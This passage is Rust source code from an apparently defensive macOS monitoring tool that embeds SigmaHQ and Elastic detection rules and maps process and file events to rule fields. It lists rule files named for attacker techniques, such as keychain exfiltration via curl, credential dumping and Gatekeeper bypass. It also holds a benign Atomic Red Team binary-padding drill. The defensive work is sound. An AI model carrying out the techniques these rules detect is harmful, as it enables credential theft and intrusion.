//! Published detection rules for macOS, evaluated in memory over one program start or one file
//! created or renamed: a process rule (`process_creation`) is asked only about a program start,
//! a file rule (`file_event`) only about a file event.
//!
//! Three sets are shipped, each a `Source`: SigmaHQ's rules, unmodified, in `rules/sigma/`, and
//! Elastic's detection rules and behaviour rules, translated mechanically into Sigma, in
//! `rules/elastic/` and `rules/elastic-behaviour/`, each set with its NOTICE, compiled into the
//! program. The source is a property of every loaded rule: a rule's name is its set and its id
//! (`sigma:<id>`, `elastic:<id>`, `elastic-behaviour:<id>`), the same in every command, and a
//! finding of a set that raises carries that name; its `Schema` says under which names an event
//! is given to its rules, and it says whether its rules state a level. Another set is
//! one more `Source`, not more code.
//!
//! What Sigma means is the evaluator's to say, `sigma-rust`'s: conditions, modifiers, case
//! folding, what an absent field or `null` means. Nothing here re-implements it; the tests below
//! pin how it behaves on the shipped rules where the specification leaves room. What is ours is
//! small: which field each part of an event is, which rules this level can evaluate, and naming
//! the ones it cannot, so none is skipped silently and none is counted among the rules that
//! watch when it does not.
//!
//! Nothing is stored and nothing is printed here.

use serde_json::{Value as Json, json};
use serde_norway::Value;
use std::collections::{BTreeMap, BTreeSet};

/// Where SigmaHQ's rules come from, and the commit they were copied at.
pub const SOURCE: &str = "https://github.com/SigmaHQ/sigma";
pub const COMMIT: &str = "d7c9da10c170a6988d68ebdf2c9f7bd8782b7c55";
pub const COMMIT_DATE: &str = "2026-11-10";
pub const LICENCE: &str = "DRL-1.1";
/// The folder they are in, relative to the repository; a rule's `file` is relative to it.
pub const FOLDER: &str = "rules/sigma";

macro_rules! shipped {
    ($folder:literal; $($path:literal,)*) => {
        &[$(($path, include_str!(concat!("../", $folder, "/", $path))),)*]
    };
}

/// Every shipped SigmaHQ rule: its path under `FOLDER` and its text. A test holds this list to
/// the folder, so a file added there and not here fails it.
pub const SHIPPED: &[(&str, &str)] = shipped![
    "rules/sigma";
    "rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/file_event_macos_malware_amos_persistence.yml",
    "rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/proc_creation_macos_malware_amos_curl_post.yml",
    "rules-emerging-threats/2026/Malware/Axios-NPM-Compromise/file_event_macos_axios_npm_compromise_indicators.yml",
    "rules-emerging-threats/2026/Malware/Axios-NPM-Compromise/proc_creation_macos_axios_npm_compromise_indicators.yml",
    "rules-threat-hunting/macos/file/file_event/file_event_macos_python_path_configuration_files.yml",
    "rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml",
    "rules/macos/file_event/file_event_macos_emond_launch_daemon.yml",
    "rules/macos/file_event/file_event_macos_susp_startup_item_created.yml",
    "rules/macos/process_creation/proc_creation_macos_applescript.yml",
    "rules/macos/process_creation/proc_creation_macos_base64_decode.yml",
    "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
    "rules/macos/process_creation/proc_creation_macos_change_file_time_attr.yml",
    "rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml",
    "rules/macos/process_creation/proc_creation_macos_clear_system_logs.yml",
    "rules/macos/process_creation/proc_creation_macos_clipboard_access_via_osascript.yml",
    "rules/macos/process_creation/proc_creation_macos_create_account.yml",
    "rules/macos/process_creation/proc_creation_macos_create_hidden_account.yml",
    "rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml",
    "rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml",
    "rules/macos/process_creation/proc_creation_macos_csrutil_status.yml",
    "rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml",
    "rules/macos/process_creation/proc_creation_macos_dscl_add_user_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_dseditgroup_add_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_dsenableroot_enable_root_account.yml",
    "rules/macos/process_creation/proc_creation_macos_file_and_directory_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_find_cred_in_files.yml",
    "rules/macos/process_creation/proc_creation_macos_gui_input_capture.yml",
    "rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml",
    "rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml",
    "rules/macos/process_creation/proc_creation_macos_installer_susp_child_process.yml",
    "rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_jamf_susp_child.yml",
    "rules/macos/process_creation/proc_creation_macos_jamf_usage.yml",
    "rules/macos/process_creation/proc_creation_macos_jxa_in_memory_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_launchctl_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_local_account.yml",
    "rules/macos/process_creation/proc_creation_macos_local_groups.yml",
    "rules/macos/process_creation/proc_creation_macos_network_service_scanning.yml",
    "rules/macos/process_creation/proc_creation_macos_network_sniffing.yml",
    "rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml",
    "rules/macos/process_creation/proc_creation_macos_office_susp_child_processes.yml",
    "rules/macos/process_creation/proc_creation_macos_osacompile_runonly_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_payload_decoded_and_decrypted.yml",
    "rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_meshagent_arguments.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_renamed_meshagent_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_access_tools_teamviewer_incoming_connection.yml",
    "rules/macos/process_creation/proc_creation_macos_remote_system_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_schedule_task_job_cron.yml",
    "rules/macos/process_creation/proc_creation_macos_screencapture.yml",
    "rules/macos/process_creation/proc_creation_macos_security_software_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_space_after_filename.yml",
    "rules/macos/process_creation/proc_creation_macos_split_file_into_pieces.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_browser_child_process.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_execution_macos_script_editor.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_find_execution.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_histfile_operations.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_in_memory_download_and_compile.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_macos_firmware_activity.yml",
    "rules/macos/process_creation/proc_creation_macos_susp_system_network_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_suspicious_applet_behaviour.yml",
    "rules/macos/process_creation/proc_creation_macos_swvers_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml",
    "rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml",
    "rules/macos/process_creation/proc_creation_macos_sysctl_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml",
    "rules/macos/process_creation/proc_creation_macos_system_shutdown_reboot.yml",
    "rules/macos/process_creation/proc_creation_macos_tail_base64_decode_from_image.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml",
    "rules/macos/process_creation/proc_creation_macos_wizardupdate_malware_infection.yml",
    "rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml",
    "rules/macos/process_creation/proc_creation_macos_xcsset_malware_infection.yml",
];

/// Elastic's detection rules for macOS, translated into Sigma: each file's path under
/// `rules/elastic`, which keeps the upstream folder, and its text. A test holds this list to the
/// folder and every file to `rules/elastic/SHA256SUMS`.
pub const ELASTIC_SHIPPED: &[(&str, &str)] = shipped![
    "rules/elastic";
    "cross-platform/command_and_control_curl_wget_spawn_via_nodejs_parent.yml",
    "cross-platform/command_and_control_google_drive_malicious_file_download.yml",
    "cross-platform/command_and_control_kubectl_networking_modification.yml",
    "cross-platform/command_and_control_tunnel_qemu.yml",
    "cross-platform/command_and_control_tunneling_via_tailscaled.yml",
    "cross-platform/credential_access_cookies_chromium_browsers_debugging.yml",
    "cross-platform/credential_access_gitleaks_execution.yml",
    "cross-platform/credential_access_suspicious_instance_metadata_service_api_cli.yml",
    "cross-platform/credential_access_trufflehog_execution.yml",
    "cross-platform/defense_evasion_data_encrypted_via_openssl.yml",
    "cross-platform/defense_evasion_deletion_of_bash_command_line_history.yml",
    "cross-platform/defense_evasion_genai_cli_unsafe_permission_bypass.yml",
    "cross-platform/defense_evasion_genai_process_compiling_executables.yml",
    "cross-platform/defense_evasion_potential_kubectl_masquerading.yml",
    "cross-platform/defense_evasion_processes_with_trailing_spaces.yml",
    "cross-platform/discovery_kubectl_permission_discovery.yml",
    "cross-platform/discovery_kubectl_secrets_all_namespaces.yml",
    "cross-platform/discovery_virtual_machine_fingerprinting_grep.yml",
    "cross-platform/execution_kubernetes_direct_api_request_via_curl_or_wget.yml",
    "cross-platform/execution_privileged_container_creation_with_host_reference.yml",
    "cross-platform/execution_register_github_actions_runner.yml",
    "cross-platform/execution_suspicious_process_execution_by_zoom.yml",
    "cross-platform/initial_access_execution_susp_react_serv_child.yml",
    "cross-platform/initial_access_papercut_java_class_file.yml",
    "cross-platform/privilege_escalation_sudoers_file_mod.yml",
    "cross-platform/privilege_escalation_trap_execution.yml",
    "macos/collection_pbpaste_execution_via_unusual_parent.yml",
    "macos/command_and_control_etherhiding_c2_via_blockchain_rpc_request.yml",
    "macos/credential_access_dumping_hashes_bi_cmds.yml",
    "macos/credential_access_dumping_keychain_security.yml",
    "macos/credential_access_kerberosdump_kcc.yml",
    "macos/credential_access_keychain_pwd_retrieval_security_cmd.yml",
    "macos/credential_access_mitm_localhost_webproxy.yml",
    "macos/defense_evasion_apple_softupdates_modification.yml",
    "macos/defense_evasion_attempt_to_disable_gatekeeper.yml",
    "macos/defense_evasion_install_root_certificate.yml",
    "macos/defense_evasion_privacy_controls_tcc_database_modification.yml",
    "macos/defense_evasion_privilege_escalation_privacy_pref_sshd_fulldiskaccess.yml",
    "macos/defense_evasion_safari_config_change.yml",
    "macos/defense_evasion_sandboxed_office_app_suspicious_zip_file.yml",
    "macos/defense_evasion_tcc_bypass_mounted_apfs_access.yml",
    "macos/defense_evasion_unload_endpointsecurity_kext.yml",
    "macos/discovery_external_ip_address_discovery_via_curl.yml",
    "macos/discovery_suspicious_sip_check.yml",
    "macos/discovery_users_domain_built_in_commands.yml",
    "macos/execution_defense_evasion_electron_app_childproc_node_js.yml",
    "macos/execution_initial_access_suspicious_browser_childproc.yml",
    "macos/lateral_movement_credential_access_kerberos_bifrostconsole.yml",
    "macos/lateral_movement_mounting_smb_share.yml",
    "macos/lateral_movement_remote_ssh_login_enabled.yml",
    "macos/lateral_movement_suspicious_curl_to_jamf_endpoint.yml",
    "macos/lateral_movement_vpn_connection_attempt.yml",
    "macos/persistence_account_creation_hide_at_logon.yml",
    "macos/persistence_apple_mail_rule_modification.yml",
    "macos/persistence_creation_hidden_login_item_osascript.yml",
    "macos/persistence_crontab_creation.yml",
    "macos/persistence_defense_evasion_hidden_launch_agent_deamon_logonitem_process.yml",
    "macos/persistence_emond_rules_process_execution.yml",
    "macos/persistence_enable_root_account.yml",
    "macos/persistence_finder_sync_plugin_pluginkit.yml",
    "macos/persistence_folder_action_scripts_runtime.yml",
    "macos/persistence_hidden_plist_filename.yml",
    "macos/persistence_login_logout_hooks_defaults.yml",
    "macos/persistence_manual_chromium_extension_loading.yml",
    "macos/persistence_screensaver_engine_unexpected_child_process.yml",
    "macos/privilege_escalation_explicit_creds_via_scripting.yml",
];

/// Elastic's behaviour rules for macOS, translated into Sigma: each file's path under
/// `rules/elastic-behaviour`, which keeps the upstream folder under `behavior/rules/`, and its
/// text. A test holds this list to the folder and every file to
/// `rules/elastic-behaviour/SHA256SUMS`.
pub const ELASTIC_BEHAVIOUR_SHIPPED: &[(&str, &str)] = shipped![
    "rules/elastic-behaviour";
    "macos/collection_sensitive_file_copy_via_ditto.yml",
    "macos/command_and_control_curl_execution_via_automator_application.yml",
    "macos/command_and_control_curl_local_file_read_or_write_via_osascript.yml",
    "macos/command_and_control_malicious_homebrew_initial_access.yml",
    "macos/command_and_control_potential_payload_download_via_applescript_applet.yml",
    "macos/command_and_control_potential_xcsset_malware_infection.yml",
    "macos/command_and_control_shlayer_malware_infection.yml",
    "macos/command_and_control_suspicious_curl_to_oast_domain.yml",
    "macos/command_and_control_suspicious_curl_user_agent.yml",
    "macos/credential_access_dumping_account_hashes_via_built_in_commands.yml",
    "macos/credential_access_keychain_credential_files_collected_via_archive_utility.yml",
    "macos/credential_access_potential_access_to_kerberos_cached_credentials.yml",
    "macos/credential_access_potential_credential_harvesting_via_python.yml",
    "macos/credential_access_suspicious_trufflehog_execution_via_nodejs.yml",
    "macos/credential_access_user_keychain_copied_via_script_interpreter.yml",
    "macos/credential_access_user_keychain_copied_via_shell_interpreter.yml",
    "macos/credential_access_user_keychain_copied_via_suspicious_parent.yml",
    "macos/credential_access_web_browsers_password_access_via_command_line.yml",
    "macos/defense_evasion_decoy_file_open_via_preview_app.yml",
    "macos/defense_evasion_dylib_load_via_ssh_keygen.yml",
    "macos/defense_evasion_elastic_endpoint_security_kernel_extension_unload.yml",
    "macos/defense_evasion_execution_of_non_executable_file_via_shell.yml",
    "macos/defense_evasion_file_hidden_via_setfile.yml",
    "macos/defense_evasion_killall_execution_via_python.yml",
    "macos/defense_evasion_launchpad_hijack.yml",
    "macos/defense_evasion_modification_of_safari_settings_via_defaults_command.yml",
    "macos/defense_evasion_operating_system_security_updates_disabled.yml",
    "macos/defense_evasion_potential_masquerading_as_system_binary.yml",
    "macos/defense_evasion_potential_privacy_control_bypass_via_localhost_secure_copy.yml",
    "macos/defense_evasion_potential_tcc_bypass_via_electron_web_inspector_api.yml",
    "macos/defense_evasion_suspicious_crypto_wallet_process_termination.yml",
    "macos/defense_evasion_suspicious_dmg_file_creation_in_tmp_directory.yml",
    "macos/defense_evasion_tccutil_reset_via_suspicious_binary.yml",
    "macos/defense_evasion_terminal_window_hidden_or_closed_via_osascript.yml",
    "macos/execution_arbitrary_python_code_execution_via_nodejs.yml",
    "macos/execution_background_process_execution_via_shell.yml",
    "macos/execution_cocoa_applet_binary_execution.yml",
    "macos/execution_disown_execution_via_shell_command_from_volume_mount.yml",
    "macos/execution_dscl_execution_via_osascript.yml",
    "macos/execution_hidden_folder_or_file_access_in_tmp_via_python.yml",
    "macos/execution_initial_access_discovery_via_applet_executable.yml",
    "macos/execution_macos_interactive_shell_spawned_via_hidden_process.yml",
    "macos/execution_osascript_execution_via_piped_applescript.yml",
    "macos/execution_suspicious_apple_script_execution.yml",
    "macos/execution_suspicious_audio_unit_plug_in_file_access.yml",
    "macos/execution_suspicious_elevated_command_execution.yml",
    "macos/execution_suspicious_installer_remote_plugin_service_child_process.yml",
    "macos/execution_temporary_binary_execution_via_osascript.yml",
    "macos/execution_volume_muted_via_osascript.yml",
    "macos/execution_vscode_extension_install_via_uri_handler.yml",
    "macos/exfiltration_user_keychain_exfiltration_via_curl.yml",
    "macos/initial_access_suspicious_execution_via_script_editor.yml",
    "macos/lateral_movement_potential_kerberos_attack_via_bifrost.yml",
    "macos/persistence_potential_persistence_via_emond.yml",
    "macos/persistence_unexpected_child_process_of_macos_screensaver_engine.yml",
    "macos/privilege_escalation_potential_privilege_escalation_via_root_crontab_file_modification.yml",
    "macos/privilege_escalation_potential_sip_bypass_via_the_shoveservice.yml",
];

/// One program start: the event level's, `crate::events::ProcessStart`, read from
/// `eslogger`'s `exec`. Which field each of its parts is, and why, is in
/// `crate::events::SIGMA_FIELDS` and `crate::events::ECS_FIELDS`, beside where the line is read. A
/// file created or renamed is `crate::events::FileEvent`, read from `create` and `rename`, its
/// fields `crate::events::FILE_SIGMA_FIELDS` and `crate::events::FILE_ECS_FIELDS`.
pub use crate::events::{FileEvent, ProcessStart};

/// The kinds of event a rule's logsource must name for this level to evaluate it: Sigma's
/// `process_creation` for a program start, `file_event` for a file created or renamed.
pub const CATEGORY: &str = "process_creation";
pub const FILE_CATEGORY: &str = "file_event";

/// The kind of event a rule is about, by its logsource category. A program start is asked
/// only of process rules, a file event only of file rules.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Process,
    File,
}

impl Kind {
    fn of(category: &str) -> Option<Kind> {
        match category {
            CATEGORY => Some(Kind::Process),
            FILE_CATEGORY => Some(Kind::File),
            _ => None,
        }
    }

    pub fn category(self) -> &'static str {
        match self {
            Kind::Process => CATEGORY,
            Kind::File => FILE_CATEGORY,
        }
    }
}

/// Sigma's names for what a program start gives, and how each is taken from it, and the same
/// for a file event, under SigmaHQ's taxonomy.
pub use crate::events::FILE_SIGMA_FIELDS as FILE_FIELDS;
pub use crate::events::SIGMA_FIELDS as FIELDS;

/// How the rules of a set name the parts of an event, and what is done to an event before
/// they are asked about it. A field a rule names that its schema does not give is one this
/// level does not have: the rule is placed as evaluated in part or not at all, the field named.
pub struct Schema {
    /// The names a program start's parts are given under, and how each is taken.
    pub process: &'static [(&'static str, crate::events::Take)],
    /// The same for a file event.
    pub file: &'static [(&'static str, crate::events::FileTake)],
    /// The fields whose value is a number, given to the evaluator as one, so that a rule can
    /// compare it.
    pub numbers: &'static [&'static str],
    /// Whether a file under one of macOS's links into `/private` is also given under its short
    /// name, as a second event (`FileEvent::names`). A rule matches the event when it matches
    /// either.
    pub links: bool,
    /// When set, every text is given again, folded one character at a time as the evaluator
    /// folds, under this prefix and its name: the field a translated regular expression that
    /// ignores case reads, since Sigma's `re` keeps case.
    pub folded: Option<&'static str>,
    /// The fields only a collector that keeps one of `crate::events::KEEPS` fills, by kind,
    /// name and what fills it (`crate::events::ECS_KEPT`).
    pub kept: &'static [(Kind, &'static str, crate::events::Keeps)],
}

/// SigmaHQ's taxonomy, as `docs/event-level.md` maps it. A path in `/private` is given under
/// its short name too, since rule authors write `/tmp/...` and Endpoint Security gives the path
/// it resolved.
pub static SIGMA_TAXONOMY: Schema = Schema {
    process: &FIELDS,
    file: &FILE_FIELDS,
    numbers: &[],
    links: true,
    folded: None,
    kept: &[],
};

/// The Elastic Common Schema's names, as Elastic's own rules for macOS read them and as the
/// translation of those rules was proven: on events built exactly this way, with no second name
/// for a path in `/private` and every text given folded too.
pub static ECS: Schema = Schema {
    process: &crate::events::ECS_FIELDS,
    file: &crate::events::FILE_ECS_FIELDS,
    numbers: &["process.args_count"],
    links: false,
    folded: Some("immune.folded."),
    kept: &crate::events::ECS_KEPT,
};

/// A published rule set this build carries. Every loaded rule knows its source; what tells one
/// set from another is here, as data.
pub struct Source {
    /// The set's name for a machine: the part of a rule's name before `:` and the rule's id.
    pub name: &'static str,
    /// Who publishes the set, for a person.
    pub publisher: &'static str,
    /// The set's name in words, as a finding says to a person where its rule came from.
    pub set: &'static str,
    /// The repository, and the commit the rules were taken at.
    pub url: &'static str,
    pub commit: &'static str,
    /// The commit's date, where it is recorded.
    pub commit_date: Option<&'static str>,
    /// The licence the rule files carry, by its SPDX identifier.
    pub licence: &'static str,
    /// The same licence by its name in words.
    pub licence_name: &'static str,
    /// The folder the shipped files are in, relative to the repository, with their NOTICE.
    pub folder: &'static str,
    /// Every rule file shipped: its path under `folder` and its text.
    pub files: &'static [(&'static str, &'static str)],
    /// How its rules name the parts of an event.
    pub schema: &'static Schema,
    /// For a set translated into Sigma, the shape the translator writes. `None` for a set
    /// published in Sigma.
    pub translation: Option<Translation>,
    /// For a translated set, the upstream rules that were not taken, after a header line, one
    /// a line, separated by tabs: the upstream file's path under its `rules/` folder, the rule's
    /// id, its name, its severity, the reason and the translation's detail.
    pub not_taken: Option<&'static str>,
    /// Whether its rules state a level. Elastic's behaviour rules state none: Elastic's sensor
    /// sets an alert's severity when it runs and does not publish which a rule gets. A rule of
    /// such a set is read without a level, and one that states a level is not read; a rule of
    /// any other set is not read without one. The core gives no rule a level of its own.
    pub states_levels: bool,
}

/// The shape of a file a translator writes: a file of a translated set is read only when it has
/// that shape, so a key the translator does not write, such as a level the set does not state,
/// is refused rather than ignored. The lists are taken from the shipped files.
#[derive(Clone, Copy)]
pub struct Translation {
    /// The key of the block in which the translation records each rule's upstream identity and
    /// the alternatives of the upstream rule it left out (`in_part_missing_fields`).
    pub record: &'static str,
    /// The keys a file may have at its top; a file may leave out one the translator writes only
    /// for some rules, and has no other.
    pub keys: &'static [&'static str],
    /// The keys of the record: every one present, and no other.
    pub record_keys: &'static [&'static str],
}

impl std::fmt::Debug for Source {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name)
    }
}

/// SigmaHQ's rules for macOS, unmodified.
pub static SIGMAHQ: Source = Source {
    name: "sigma",
    publisher: "SigmaHQ",
    set: "SigmaHQ's rule set",
    url: SOURCE,
    commit: COMMIT,
    commit_date: Some(COMMIT_DATE),
    licence: LICENCE,
    licence_name: "Detection Rule License 1.1",
    folder: FOLDER,
    files: SHIPPED,
    schema: &SIGMA_TAXONOMY,
    translation: None,
    not_taken: None,
    states_levels: true,
};

/// Elastic's detection rules for macOS, those that translate into Sigma exactly over this
/// level's log, and the rest named with why.
pub static ELASTIC: Source = Source {
    name: "elastic",
    publisher: "Elastic",
    set: "Elastic's detection rules",
    url: "https://github.com/elastic/detection-rules",
    commit: "032ac5ecb0b4035a12b03dd25164e2fbcfae9fad",
    commit_date: None,
    licence: "Elastic-2.0",
    licence_name: "Elastic License 2.0",
    folder: "rules/elastic",
    files: ELASTIC_SHIPPED,
    schema: &ECS,
    translation: Some(Translation {
        record: "elastic",
        // `falsepositives` only where the upstream rule names some.
        keys: &[
            "title",
            "id",
            "status",
            "description",
            "references",
            "author",
            "license",
            "date",
            "modified",
            "tags",
            "falsepositives",
            "logsource",
            "detection",
            "level",
            "elastic",
        ],
        record_keys: &[
            "rule_id",
            "severity",
            "risk_score",
            "query_sha256",
            "kinds",
            "in_part_missing_fields",
            "also_asks_events",
            "null_sensitive",
            "folded_fields",
        ],
    }),
    not_taken: Some(include_str!("../rules/elastic/not-taken.tsv")),
    states_levels: true,
};

/// Elastic's behaviour rules for macOS, those that translate into Sigma exactly over this
/// level's log, and the rest named with why. They state no level, so none of them raises a
/// finding by itself; their matches are counted and handed over. The actions every one of them
/// carries upstream, stopping a process, are recorded by the translation as ignored, and the
/// core takes none.
pub static ELASTIC_BEHAVIOUR: Source = Source {
    name: "elastic-behaviour",
    publisher: "Elastic",
    set: "Elastic's behaviour rules",
    url: "https://github.com/elastic/protections-artifacts",
    commit: "a87715d87a2babd51b37ff6c55f104fe7e567911",
    commit_date: None,
    licence: "Elastic-2.0",
    licence_name: "Elastic License 2.0",
    folder: "rules/elastic-behaviour",
    files: ELASTIC_BEHAVIOUR_SHIPPED,
    schema: &ECS,
    // No `level`, and the record's `severity` and `risk_score` are null.
    translation: Some(Translation {
        record: "elastic",
        keys: &[
            "title",
            "id",
            "status",
            "description",
            "references",
            "license",
            "tags",
            "logsource",
            "detection",
            "elastic",
        ],
        record_keys: &[
            "rule_id",
            "version",
            "severity",
            "risk_score",
            "query_sha256",
            "kinds",
            "in_part_missing_fields",
            "also_asks_events",
            "null_sensitive",
            "folded_fields",
            "actions_ignored",
            "elastic_also_evaluates_on",
        ],
    }),
    not_taken: Some(include_str!("../rules/elastic-behaviour/not-taken.tsv")),
    states_levels: false,
};

/// Every set shipped, in the order their rules are listed and asked.
pub static SOURCES: [&Source; 3] = [&SIGMAHQ, &ELASTIC, &ELASTIC_BEHAVIOUR];

/// Where each field of a schema stands among the values of an event: a program start's
/// fields first, then a file event's, each followed by its folded companions where the schema
/// has them, so that one search over the values serves both kinds.
struct Layout {
    schema: &'static Schema,
    names: Vec<String>,
    /// Which of `names` are numbers.
    numbers: Vec<bool>,
    /// Where a file event's fields begin.
    file_at: usize,
    /// Which texts the rules of this schema need in each field, searched for once per event;
    /// `None` asks every rule.
    texts: Option<Texts>,
}

impl Layout {
    fn new(schema: &'static Schema) -> Layout {
        let mut names = Vec::new();
        let mut numbers = Vec::new();
        let mut kind = |base: Vec<&str>| {
            let texts: Vec<&str> = base
                .iter()
                .filter(|n| !schema.numbers.contains(n))
                .copied()
                .collect();
            for n in &base {
                names.push(n.to_string());
                numbers.push(schema.numbers.contains(n));
            }
            for n in schema
                .folded
                .into_iter()
                .flat_map(|p| texts.iter().map(move |n| (p, n)))
            {
                names.push(format!("{}{}", n.0, n.1));
                numbers.push(false);
            }
            names.len()
        };
        let file_at = kind(schema.process.iter().map(|(n, _)| *n).collect());
        kind(schema.file.iter().map(|(n, _)| *n).collect());
        Layout {
            schema,
            names,
            numbers,
            file_at,
            texts: None,
        }
    }

    /// Where the fields of `kind` stand among the values.
    fn range(&self, kind: Kind) -> std::ops::Range<usize> {
        match kind {
            Kind::Process => 0..self.file_at,
            Kind::File => self.file_at..self.names.len(),
        }
    }

    /// The names of what an event of `kind` gives under this schema.
    fn names(&self, kind: Kind) -> &[String] {
        &self.names[self.range(kind)]
    }

    /// A field of `kind` by its name, as its place among the values.
    fn field(&self, kind: Kind, name: &str) -> Option<usize> {
        let range = self.range(kind);
        let at = range.start;
        self.names[range]
            .iter()
            .position(|n| n == name)
            .map(|i| at + i)
    }

    /// The values of every field, `names` long, the other kind's absent. A file event gives one
    /// set of values for each name its file has where the schema says so: a rule matches the
    /// event when it matches any of them.
    fn forms(&self, subject: Subject) -> Vec<Vec<Option<String>>> {
        let schema = self.schema;
        let with_folded = |base: Vec<Option<String>>, numbers: &[bool]| -> Vec<Option<String>> {
            let mut values = base.clone();
            if schema.folded.is_some() {
                values.extend(
                    base.iter()
                        .zip(numbers)
                        .filter(|(_, number)| !**number)
                        .map(|(v, _)| v.as_deref().map(fold)),
                );
            }
            values
        };
        let process_numbers = &self.numbers[..schema.process.len()];
        let file_numbers = &self.numbers[self.file_at..self.file_at + schema.file.len()];
        match subject {
            Subject::Start(s) => {
                let base = schema.process.iter().map(|(_, take)| take(s)).collect();
                let mut values = with_folded(base, process_numbers);
                values.resize(self.names.len(), None);
                vec![values]
            }
            Subject::File(f) => {
                let names = if schema.links {
                    f.names()
                } else {
                    vec![f.path.as_str()]
                };
                names
                    .into_iter()
                    .map(|name| {
                        let mut values = vec![None; self.file_at];
                        let base = schema.file.iter().map(|(_, take)| take(f, name)).collect();
                        values.extend(with_folded(base, file_numbers));
                        values
                    })
                    .collect()
            }
        }
    }

    /// The evaluator's event for one set of values of a kind: a field the event does not give
    /// stays absent, and an absent field matches nothing. A number is given as one.
    fn event(&self, kind: Kind, values: &[Option<String>]) -> sigma_rust::Event {
        let mut event = sigma_rust::Event::new();
        for i in self.range(kind) {
            let Some(value) = &values[i] else { continue };
            let name = self.names[i].as_str();
            if self.numbers[i]
                && let Ok(n) = value.parse::<i64>()
            {
                event.insert(name, n);
            } else {
                event.insert(name, value.clone());
            }
        }
        event
    }
}

/// An event the rules are asked about.
#[derive(Clone, Copy, Debug)]
pub enum Subject<'a> {
    Start(&'a ProcessStart),
    File(&'a FileEvent),
}

impl<'a> From<&'a ProcessStart> for Subject<'a> {
    fn from(s: &'a ProcessStart) -> Self {
        Subject::Start(s)
    }
}

impl<'a> From<&'a FileEvent> for Subject<'a> {
    fn from(f: &'a FileEvent) -> Self {
        Subject::File(f)
    }
}

impl Subject<'_> {
    pub fn kind(&self) -> Kind {
        match self {
            Subject::Start(_) => Kind::Process,
            Subject::File(_) => Kind::File,
        }
    }

    /// Which of `crate::events::KEEPS` the collector that wrote its line kept.
    fn kept(&self) -> crate::events::Keeps {
        match self {
            Subject::Start(s) => s.kept,
            Subject::File(f) => f.kept,
        }
    }
}

/// The drill: Atomic Red Team's tests ffe2346c-abd5-4b45-a713-bf5f1ebd573a and
/// e22a9e89-69c7-410f-a473-e6c212cd2292 (T1027.001), as the program starts their commands
/// make. `sh` runs each line; the redirection to the padded file is the shell's, so the
/// program gets only these arguments. Each must raise "Binary Padding - MacOS". The summary
/// runs them through this binary's evaluator, so it says whether the evaluator works here.
pub const DRILL_RULE: &str = "95361ce5-c891-4b0a-87ca-e24607884a96";
pub const DRILL: [(&str, &str, &[&str]); 4] = [
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/zero", "bs=1", "count=1"],
    ),
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/random", "bs=1", "count=1"],
    ),
    (
        "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
        "/bin/dd",
        &["dd", "if=/dev/urandom", "bs=1", "count=1"],
    ),
    (
        "e22a9e89-69c7-410f-a473-e6c212cd2292",
        "/usr/bin/truncate",
        &["truncate", "-s", "+1", "/tmp/evil-binary"],
    ),
];

/// A drill start: started by `sh`, as Atomic Red Team's `sh` executor starts it.
pub fn drill_start(image: &str, args: &[&str]) -> ProcessStart {
    ProcessStart {
        executable: image.to_string(),
        args: args.iter().map(|a| a.to_string()).collect(),
        parent_executable: Some("/bin/sh".to_string()),
        ..ProcessStart::default()
    }
}

/// How bad, Sigma's levels; their names are OCSF's severity names. Elastic's severities, `low`,
/// `medium`, `high` and `critical`, are levels of the same names.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Level {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

const LEVELS: [(&str, Level); 5] = [
    ("informational", Level::Informational),
    ("low", Level::Low),
    ("medium", Level::Medium),
    ("high", Level::High),
    ("critical", Level::Critical),
];

impl Level {
    /// Whether a match of a rule of this level raises a finding. Sigma's specification says a
    /// `high` rule "should trigger an internal alert" and that lower levels are rarely an
